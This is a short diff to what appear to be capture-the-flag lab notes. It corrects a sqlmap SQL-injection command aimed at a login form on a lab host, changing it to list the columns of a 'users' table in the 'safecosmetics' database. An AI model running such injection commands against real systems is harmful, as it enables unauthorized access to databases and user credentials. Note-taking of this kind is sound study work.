@@ -32,7 +32,7 @@ Database: writer
 ```
 ## show columns of table
 ```bash
-$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --tables -D safecosmetics -T users
+$ sqlmap -u http://10.10.11.101/administrative --data="uname=root&password=root" --method POST --columns -D safecosmetics -T users
 ```
 
 ## show current user
